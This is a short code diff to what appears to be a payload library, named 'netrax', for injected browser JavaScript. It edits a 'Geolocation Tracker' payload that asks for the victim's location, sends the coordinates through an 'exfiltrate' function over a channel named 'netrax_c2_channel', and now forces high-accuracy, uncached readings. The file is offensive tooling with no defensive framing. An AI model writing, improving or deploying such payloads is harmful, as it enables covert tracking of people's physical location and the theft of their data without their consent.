@@ -118,7 +118,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     },
     {
         name: "Geolocation Tracker",
-        description: "Requests the user's location and sends the coordinates back.",
+        description: "Requests the user's high-accuracy location and sends the coordinates back.",
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -139,6 +139,11 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
             },
             (error) => {
                 exfiltrate('location', { error: error.message });
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             }
         );
     } else {
